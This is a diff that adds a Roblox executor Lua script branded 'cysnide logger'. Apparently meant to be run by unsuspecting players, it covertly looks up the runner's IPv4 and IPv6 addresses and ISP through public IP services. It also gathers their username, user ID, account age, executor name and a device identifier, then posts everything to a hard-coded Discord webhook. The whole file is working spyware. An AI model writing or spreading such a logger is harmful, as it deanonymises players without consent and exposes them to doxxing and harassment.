@@ -1,0 +1,101 @@
+local httpService = game:GetService("HttpService")
+local players = game:GetService("Players")
+local player = players.LocalPlayer
+
+local webhookUrl = "https://discord.com/api/webhooks/1553546521734156399/Bq35JuUBdvYJDoYMZti0c0aHolshFBtL8yb-XmHeqxD4MX-FfOq3VZZ-GRzdRE2He1A7"
+
+local function sendRequest(url, method, headers, body)
+    local req = (syn and syn.request) or (http and http.request) or request or (fluxus and fluxus.request)
+    if req then
+        local success, response = pcall(function()
+            return req({
+                Url = url,
+                Method = method,
+                Headers = headers,
+                Body = body
+            })
+        end)
+        if success then return response end
+    end
+    return nil
+end
+
+local ipv4Address = "N/A (Not Supported/Found)"
+local ipv6Address = "N/A (Not Supported/Found)"
+local ispProvider = "Unknown"
+
+-- Fetch IPv4 and ISP details
+pcall(function()
+    local response = sendRequest("http://ip-api.com/json/", "GET", nil, nil)
+    if response and response.Body then
+        local data = httpService:JSONDecode(response.Body)
+        if data and data.status == "success" then
+            ipv4Address = data.query or "N/A"
+            ispProvider = (data.isp or "Unknown") .. " (" .. (data.org or "Unknown") .. ")"
+        end
+    end
+    
+    if ipv4Address == "N/A (Not Supported/Found)" then
+        local fallback = sendRequest("https://api.ipify.org", "GET", nil, nil)
+        if fallback and fallback.Body then
+            ipv4Address = fallback.Body
+        end
+    end
+end)
+
+-- Fetch IPv6 address (if the network/device supports IPv6)
+pcall(function()
+    local response = sendRequest("https://api64.ipify.org", "GET", nil, nil)
+    if response and response.Body then
+        local result = response.Body
+        -- Check if it actually contains a colon (characteristic of IPv6)
+        if result:find(":") then
+            ipv6Address = result
+        end
+    end
+end)
+
+local userId = player.UserId
+local username = player.Name
+local displayName = player.DisplayName
+local accountAge = (os.time() - player.AccountAge) / 86400
+
+local hwid = "N/A"
+pcall(function()
+    if getexecutorname and getexecutorname() then
+        hwid = getexecutorname() .. "_" .. tostring(userId)
+    elseif identifyexecutor then
+        hwid = identifyexecutor() .. "_" .. tostring(userId)
+    end
+end)
+
+local executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+local data = {
+    ["content"] = nil,
+    ["embeds"] = {{
+        ["title"] = "cysnide logger",
+        ["color"] = 0xFF4444,
+        ["fields"] = {
+            {["name"] = "user", ["value"] = string.format("%s (@%s)", displayName, username), ["inline"] = true},
+            {["name"] = "userid", ["value"] = tostring(userId), ["inline"] = true},
+            {["name"] = "acc age", ["value"] = string.format("%.1f days", accountAge), ["inline"] = true},
+            {["name"] = "IPv4", ["value"] = ipv4Address, ["inline"] = true},
+            {["name"] = "IPv6", ["value"] = ipv6Address, ["inline"] = true},
+            {["name"] = "ISP / Network", ["value"] = ispProvider, ["inline"] = false},
+            {["name"] = "exec", ["value"] = tostring(executor), ["inline"] = true},
+            {["name"] = "HWID", ["value"] = tostring(hwid), ["inline"] = true},
+            {["name"] = "game id", ["value"] = tostring(placeId), ["inline"] = true},
+            {["name"] = "job id", ["value"] = tostring(jobId), ["inline"] = true},
+        },
+        ["footer"] = {["text"] = "logged via cyanide"},
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+pcall(function()
+    local jsonData = httpService:JSONEncode(data)
+    sendRequest(webhookUrl, "POST", {["Content-Type"] = "application/json"}, jsonData)
+end)
